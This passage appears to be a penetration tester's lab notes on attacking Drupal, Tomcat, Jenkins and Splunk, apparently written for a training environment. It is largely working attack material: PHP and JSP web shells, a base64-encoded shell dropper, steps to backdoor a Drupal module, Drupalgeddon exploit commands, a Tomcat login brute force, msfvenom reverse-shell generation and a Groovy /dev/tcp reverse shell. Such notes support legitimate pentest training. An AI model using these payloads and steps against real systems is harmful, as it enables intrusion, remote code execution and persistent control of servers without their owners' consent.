<li>References to <a href="https://www.drupal.org/docs/core-modules-and-themes/core-modules/node-module/about-nodes">nodes</a>: <code>http://drupal.inlanefreight.local/node/1</code></li>
</ul>
<h3 id="enumeration_1">Enumeration</h3>
<ul>
<li>
<p>Drupal supports three types of users by default:</p>
<ul>
<li>Administrator: This user has complete control over the Drupal website.</li>
<li>Authenticated User: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.</li>
<li>Anonymous: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.</li>
</ul>
</li>
<li>
<p>Output first two lines of CHANGELOG.txt to see the version in use (will return 404 on latest versions):
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1">curl<span class="w"> </span>-s<span class="w"> </span>http://drupal-acc.inlanefreight.local/CHANGELOG.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-m2<span class="w"> </span><span class="s2">&quot;&quot;</span>
</span></code></pre></div></td></tr></table></div></p>
</li>
<li>use droopscan:
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1">droopescan<span class="w"> </span>scan<span class="w"> </span>drupal<span class="w"> </span>-u<span class="w"> </span>http://drupal.inlanefreight.local
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h3 id="attacking-drupal">Attacking Drupal</h3>
<h4 id="leveraging-the-php-filter-module">Leveraging the PHP Filter Module</h4>
<ul>
<li>Log in as admin</li>
<li>Enable the PHP filter module by ticking the check box next to the module and scroll down to Save configuration</li>
<li>Go to Content --&gt; Add content and create a Basic page</li>
<li>Create malicious page:
<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><span class="cp">&lt;?php</span>
</span><span id="__span-24-2"><span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dcfdd5e021a869fcc6dfaef8bf31377e&#39;</span><span class="p">]);</span>
</span><span id="__span-24-3"><span class="cp">?&gt;</span>
</span></code></pre></div></td></tr></table></div></li>
<li>Set Text format drop-down to PHP code</li>
<li>Click Save</li>
<li>
<p>Check function of reverse shell
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1">curl<span class="w"> </span>-s<span class="w"> </span>http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e<span class="o">=</span>id<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>uid<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-f4<span class="w"> </span>-d<span class="s2">&quot;&gt;&quot;</span>
</span></code></pre></div></td></tr></table></div></p>
</li>
<li>
<p>From version 8 onwards the <a href="https://www.drupal.org/project/php/releases/8.x-1.1">PHP Filter</a> module requires installing first:
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1">wget<span class="w"> </span>https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
</span></code></pre></div></td></tr></table></div></p>
</li>
<li>May need to adjust above command for most recent version</li>
<li>Once downloaded go to <code>Administration &gt; Reports &gt; Available updates</code> (location may differ)</li>
<li><code>Browse</code> to select downloaded file and click <code>Install</code></li>
<li>Once installed click <code>Content</code> to create basic page like before</li>
<li>Post pentest delete any installed modules and created pages</li>
</ul>
<h4 id="uploading-a-backdoored-module">Uploading a Backdoored Module</h4>
<ul>
<li>Add a shell to an existing module</li>
<li>Example using the CAPTCHA module</li>
<li>Download module
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1">wget<span class="w"> </span>--no-check-certificate<span class="w">  </span>https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
</span><span id="__span-27-2">tar<span class="w"> </span>xvf<span class="w"> </span>captcha-8.x-1.2.tar.gz
</span></code></pre></div></td></tr></table></div>
Create a webshell file:
<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><span class="cp">&lt;?php</span>
</span><span id="__span-28-2"><span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fe8edbabc5c5c9b7b764504cd22b17af&#39;</span><span class="p">]);</span>
</span><span id="__span-28-3"><span class="cp">?&gt;</span>
</span></code></pre></div></td></tr></table></div>
Create a .htaccess file to give ourselves access to the folder
<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><span class="p">&lt;</span><span class="nt">IfModule</span> <span class="na">mod_rewrite</span><span class="err">.</span><span class="na">c</span><span class="p">&gt;</span>
</span><span id="__span-29-2">RewriteEngine On
</span><span id="__span-29-3">RewriteBase /
</span><span id="__span-29-4"><span class="p">&lt;/</span><span class="nt">IfModule</span><span class="p">&gt;</span>
</span></code></pre></div></td></tr></table></div></li>
<li>Copy created files to the captcha folder
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1">mv<span class="w"> </span>shell.php<span class="w"> </span>.htaccess<span class="w"> </span>captcha
</span><span id="__span-30-2">tar<span class="w"> </span>cvf<span class="w"> </span>captcha.tar.gz<span class="w"> </span>captcha/
</span></code></pre></div></td></tr></table></div></li>
<li>Login to site with admin access</li>
<li>Click on <code>Manage</code> and then <code>Extend</code> on the sidebar</li>
<li>Click on the <code>+ Install new module</code> button</li>
<li>Browse to the backdoored Captcha archive and click <code>Install</code></li>
<li>Browse to <code>/modules/captcha/shell.php</code> to execute commands
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1">curl<span class="w"> </span>-s<span class="w"> </span>drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af<span class="o">=</span>id
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h4 id="drupalgeddon">Drupalgeddon</h4>
<ul>
<li>Affects versions 7.0 up to 7.31</li>
<li>Used to upload a malicious form or create a new admin user</li>
<li><a href="https://www.exploit-db.com/exploits/34992">PoC</a></li>
<li>Supply the target URL and a username and password for our new admin account
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-32-1">python2.7<span class="w"> </span>drupalgeddon.py<span class="w"> </span>-t<span class="w"> </span>http://drupal-qa.inlanefreight.local<span class="w"> </span>-u<span class="w"> </span>hacker<span class="w"> </span>-p<span class="w"> </span>pwnd
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h4 id="drupalgeddon2">Drupalgeddon2</h4>
<ul>
<li>Affects versions prior to 7.58 and 8.5.1</li>
<li>Allows system-level commands to be maliciously injected</li>
<li><a href="https://www.exploit-db.com/exploits/44448">PoC</a></li>
<li>Replace the echo command in the exploit script with a command to write out our malicious PHP script (and references to hello.txt):
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-33-1"><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>mrb3n.php
</span></code></pre></div></td></tr></table></div></li>
<li>Run module and fill in relevant details to upload shell
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-34-1">python3<span class="w"> </span>drupalgeddon2.py
</span><span id="__span-34-2">...
</span><span id="__span-34-3">Enter<span class="w"> </span>target<span class="w"> </span>url<span class="w"> </span><span class="o">(</span>example:<span class="w"> </span>https://domain.ltd/<span class="o">)</span>:<span class="w"> </span>http://drupal-dev.inlanefreight.local/
</span><span id="__span-34-4">Check:<span class="w"> </span>http://drupal-dev.inlanefreight.local/mrb3n.php
</span></code></pre></div></td></tr></table></div></li>
<li>Confirm RCE
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-35-1">curl<span class="w"> </span>http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af<span class="o">=</span>id
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h4 id="drupalgeddon3">Drupalgeddon3</h4>
<ul>
<li>Affects multiple versions of Drupal 7.x and 8.x </li>
<li>RCE vulnerability that exploits improper validation in the Form API</li>
<li>Requires a user to have the ability to delete a node</li>
<li>Log in and obtain a valid session cookie</li>
<li>Load metasploit and add required options
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span>
<span class="normal">7</span>
<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-36-1">msfconsole
</span><span id="__span-36-2">use<span class="w"> </span>multi/http/drupal_drupageddon3
</span><span id="__span-36-3"><span class="nb">set</span><span class="w"> </span>rhosts<span class="w"> </span><span class="m">10</span>.129.42.195
</span><span id="__span-36-4"><span class="nb">set</span><span class="w"> </span>VHOST<span class="w"> </span>drupal-acc.inlanefreight.local<span class="w">   </span>
</span><span id="__span-36-5"><span class="nb">set</span><span class="w"> </span>drupal_session<span class="w"> </span><span class="nv">SESS45ecfcb93a827c3e578eae161f280548</span><span class="o">=</span>jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
</span><span id="__span-36-6"><span class="nb">set</span><span class="w"> </span>DRUPAL_NODE<span class="w"> </span><span class="m">1</span>
</span><span id="__span-36-7"><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">10</span>.10.14.15
</span><span id="__span-36-8">exploit
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h2 id="tomcat">Tomcat</h2>
<h3 id="discoveryfootprinting">Discovery/Footprinting</h3>
<ul>
<li>grep docs page for version
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-37-1">curl<span class="w"> </span>-s<span class="w"> </span>http://app-dev.inlanefreight.local:8080/docs/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>Tomcat<span class="w"> </span>
</span></code></pre></div></td></tr></table></div></li>
<li>General folder structure of Tomcat installation:
<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-38-1"> bin                             # Stores scripts and binaries needed to start and run a Tomcat server
</span><span id="__span-38-2"> conf                            # Stores various configuration files used by Tomcat
</span><span id="__span-38-3">    catalina.policy
</span><span id="__span-38-4">    catalina.properties
</span><span id="__span-38-5">    context.xml
</span><span id="__span-38-6">    tomcat-users.xml
</span><span id="__span-38-7">    tomcat-users.xsd
</span><span id="__span-38-8">    web.xml
</span><span id="__span-38-9"> lib                             # Stores the various JAR files needed for the correct functioning of Tomcat
</span><span id="__span-38-10"> logs                            # Log files
</span><span id="__span-38-11"> temp                            # Tempory files
</span><span id="__span-38-12"> webapps                         # Default webroot of Tomcat and hosts all the applications
</span><span id="__span-38-13">    manager
</span><span id="__span-38-14">       images
</span><span id="__span-38-15">       META-INF
</span><span id="__span-38-16">       WEB-INF
</span><span id="__span-38-17">|   |        web.xml
</span><span id="__span-38-18">    ROOT
</span><span id="__span-38-19">        WEB-INF
</span><span id="__span-38-20"> work                            # Acts as a cache and is used to store data during runtime
</span><span id="__span-38-21">     Catalina
</span><span id="__span-38-22">         localhost
</span></code></pre></div></td></tr></table></div></li>
<li>Each folder inside webapps is expected to have the following structure:
<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-39-1">webapps/customapp
</span><span id="__span-39-2"> images
</span><span id="__span-39-3"> index.jsp
</span><span id="__span-39-4"> META-INF
</span><span id="__span-39-5">    context.xml
</span><span id="__span-39-6"> status.xsd
</span><span id="__span-39-7"> WEB-INF
</span><span id="__span-39-8">     jsp
</span><span id="__span-39-9">    |    admin.jsp
</span><span id="__span-39-10">     web.xml                     # Deployment descriptor, stores information about the routes/classes handling these routes
</span><span id="__span-39-11">     lib                         # Stores the libraries needed by that particular application
</span><span id="__span-39-12">    |     jdbc_drivers.jar
</span><span id="__span-39-13">     classes                     # Classes might contain important business logic as well as sensitive information
</span><span id="__span-39-14">         AdminServlet.class   
</span></code></pre></div></td></tr></table></div></li>
<li>Example web.xml file (important to check to leverage LFI):
<div class="language-xml highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">XML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-40-1"><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
</span><span id="__span-40-2">
</span><span id="__span-40-3"><span class="cp">&lt;!DOCTYPE web-app PUBLIC &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot; &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;&gt;</span>
</span><span id="__span-40-4">
</span><span id="__span-40-5"><span class="nt">&lt;web-app&gt;</span>
</span><span id="__span-40-6"><span class="w">  </span><span class="nt">&lt;servlet&gt;</span>
</span><span id="__span-40-7"><span class="w">    </span><span class="nt">&lt;servlet-name&gt;</span>AdminServlet<span class="nt">&lt;/servlet-name&gt;</span>
</span><span id="__span-40-8"><span class="w">    </span><span class="nt">&lt;servlet-class&gt;</span>com.inlanefreight.api.AdminServlet<span class="nt">&lt;/servlet-class&gt;</span>
</span><span id="__span-40-9"><span class="w">  </span><span class="nt">&lt;/servlet&gt;</span>
</span><span id="__span-40-10">
</span><span id="__span-40-11"><span class="w">  </span><span class="nt">&lt;servlet-mapping&gt;</span>
</span><span id="__span-40-12"><span class="w">    </span><span class="nt">&lt;servlet-name&gt;</span>AdminServlet<span class="nt">&lt;/servlet-name&gt;</span>
</span><span id="__span-40-13"><span class="w">    </span><span class="nt">&lt;url-pattern&gt;</span>/admin<span class="nt">&lt;/url-pattern&gt;</span>
</span><span id="__span-40-14"><span class="w">  </span><span class="nt">&lt;/servlet-mapping&gt;</span>
</span><span id="__span-40-15"><span class="nt">&lt;/web-app&gt;</span><span class="w"> </span>
</span></code></pre></div></td></tr></table></div></li>
<li><code>tomcat-users.xml</code> has valuable user information</li>
</ul>
<h3 id="enumeration_2">Enumeration</h3>
<ul>
<li>Attempt to locate the /manager and /host-manager pages:
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-41-1">gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://web01.inlanefreight.local:8180/<span class="w"> </span>-w<span class="w"> </span>/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt<span class="w"> </span>
</span></code></pre></div></td></tr></table></div></li>
<li>Try to log in with weak creds (tomcat:tomcat, admin:admin) or bruteforce</li>
</ul>
<h3 id="attacking-tomcat">Attacking Tomcat</h3>
<h4 id="tomcat-manager-login-brute-force">Tomcat Manager - Login Brute Force</h4>
<ul>
<li>Try bruteforcing the Tomcat manager page using Metasploit:
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span>
<span class="normal">7</span>
<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-42-1">msfconsole
</span><span id="__span-42-2">use<span class="w"> </span>auxiliary/scanner/http/tomcat_mgr_login
</span><span id="__span-42-3"><span class="nb">set</span><span class="w"> </span>VHOST<span class="w"> </span>web01.inlanefreight.local
</span><span id="__span-42-4"><span class="nb">set</span><span class="w"> </span>RPORT<span class="w"> </span><span class="m">8180</span>
</span><span id="__span-42-5"><span class="nb">set</span><span class="w"> </span>stop_on_success<span class="w"> </span><span class="nb">true</span>
</span><span id="__span-42-6"><span class="nb">set</span><span class="w"> </span>rhosts<span class="w"> </span><span class="m">10</span>.129.128.204<span class="w"> </span>
</span><span id="__span-42-7">show<span class="w"> </span>options<span class="w"> </span>
</span><span id="__span-42-8">run
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h4 id="tomcat-manager-war-file-upload">Tomcat Manager - WAR File Upload</h4>
<ul>
<li>Available at /manager/html by default</li>
<li>Users assigned the manager-gui role are allowed to access</li>
<li>Login to manager page (<code>http://web01.inlanefreight.local:8180/manager/html</code>) once valid credentials obtained</li>
<li>Download JSP web shell and zip it as a .war file
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-43-1">wget<span class="w"> </span>https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
</span><span id="__span-43-2">zip<span class="w"> </span>-r<span class="w"> </span>backup.war<span class="w"> </span>cmd.jsp<span class="w"> </span>
</span></code></pre></div></td></tr></table></div></li>
<li>In the GUI click on <code>Browse</code> to select the .war file and then click on <code>Deploy</code></li>
<li>Once uploaded the <code>/backup</code> application should appear in the applications table</li>
<li>Confirm webshell execution <code>curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id</code></li>
<li>
<p>Undeploy backups application once done</p>
</li>
<li>
<p>Can also create a reverse shell using msfvenom
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-44-1">msfvenom<span class="w"> </span>-p<span class="w"> </span>java/jsp_shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.251<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span><span class="w"> </span>-f<span class="w"> </span>war<span class="w"> </span>&gt;<span class="w"> </span>backup.war
</span></code></pre></div></td></tr></table></div></p>
</li>
<li>Start a Netcat listener and click on /backup to execute the shell.
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-45-1">nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">4443</span>
</span></code></pre></div></td></tr></table></div></li>
<li>Metaploit module <code>multi/http/tomcat_mgr_upload</code> can automate this process</li>
</ul>
<h2 id="jenkins"><a href="https://www.jenkins.io/">Jenkins</a></h2>
<h3 id="discovery-enumeration">Discovery &amp; Enumeration</h3>
<ul>
<li>0pen-source automation server written in Java that helps developers build and test their software projects continuously</li>
<li>Default runs on port 8080 with slaves on 5000</li>
<li>Default login page reveals we are dealing with Jenkins</li>
<li>Default credentials admin:admin</li>
</ul>
<h3 id="attacking-jenkins">Attacking Jenkins</h3>
<h4 id="script-console">Script Console</h4>
<ul>
<li>Run arbitrary Groovy scripts within the Jenkins controller runtime</li>
<li>Found at <code>http://jenkins.inlanefreight.local:8000/script</code></li>
</ul>
<p><strong>Linux Hosts</strong>
- Example groovy script:
<div class="language-groovy highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Groovy</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-46-1"><span class="kt">def</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;id&#39;</span>
</span><span id="__span-46-2"><span class="kt">def</span><span class="w"> </span><span class="n">sout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuffer</span><span class="o">(),</span><span class="w"> </span><span class="n">serr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuffer</span><span class="o">()</span>
</span><span id="__span-46-3"><span class="kt">def</span><span class="w"> </span><span class="n">proc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cmd</span><span class="o">.</span><span class="na">execute</span><span class="o">()</span>
</span><span id="__span-46-4"><span class="n">proc</span><span class="o">.</span><span class="na">consumeProcessOutput</span><span class="o">(</span><span class="n">sout</span><span class="o">,</span><span class="w"> </span><span class="n">serr</span><span class="o">)</span>
</span><span id="__span-46-5"><span class="n">proc</span><span class="o">.</span><span class="na">waitForOrKill</span><span class="o">(</span><span class="mi">1000</span><span class="o">)</span>
</span><span id="__span-46-6"><span class="n">println</span><span class="w"> </span><span class="n">sout</span>
</span></code></pre></div></td></tr></table></div>
- Reverse shell script
<div class="language-groovy highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Groovy</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-47-1"><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
</span><span id="__span-47-2"><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s2">&quot;/bin/bash&quot;</span><span class="o">,</span><span class="s2">&quot;-c&quot;</span><span class="o">,</span><span class="s2">&quot;exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">String</span><span class="o">[])</span>
</span><span id="__span-47-3"><span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>
</span></code></pre></div></td></tr></table></div>
- Can use metasploit to get reverse shell:
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-48-1">use<span class="w"> </span>exploit/multi/http/jenkins_script_console
</span><span id="__span-48-2"><span class="nb">set</span><span class="w"> </span>TARGET<span class="w"> </span>&lt;<span class="w"> </span>target-id<span class="w"> </span>&gt;
</span><span id="__span-48-3">exploit
</span></code></pre></div></td></tr></table></div>
- Start listener and upgrade to interactive shell:
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-49-1">nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">8443</span>
</span><span id="__span-49-2">/bin/bash<span class="w"> </span>-i
</span></code></pre></div></td></tr></table></div></p>
<h2 id="splunk">Splunk</h2>
<h3 id="discovery_2">Discovery</h3>
<ul>
<li>Runs on port 8000 by default, port 8089 is the Splunk management port for communication with the Splunk REST API</li>
<li>Detect with nmap service scan:
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-50-1">sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.129.201.50
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h3 id="enumeration_3">Enumeration</h3>
<ul>
<li>Check for a forgotton about trial version (converts to free version with no authentication after 60 days)</li>
<li>Older versions have default creds admin:changeme</li>
<li>Later versions set creds during install, check for common weak passwords (admin, Welcome, Welcome1, Password123, etc)</li>
</ul>
<h3 id="attacking-splunk">Attacking Splunk</h3>
<h4 id="abusing-built-in-functionality_1">Abusing Built-In Functionality</h4>
<p><strong>Windows Hosts</strong>
- Clone reverse shell from GitHub
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-51-1">git<span class="w"> </span>clone<span class="w"> </span>https://github.com/0xjpuff/reverse_shell_splunk.git
</span></code></pre></div></td></tr></table></div>
- Edit attacker_ip_here and attacker_port_here in <code>reverse_shell_splunk/reverse_shell_splunk/bin/run.ps1</code>
- Create tar ball of the directory
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
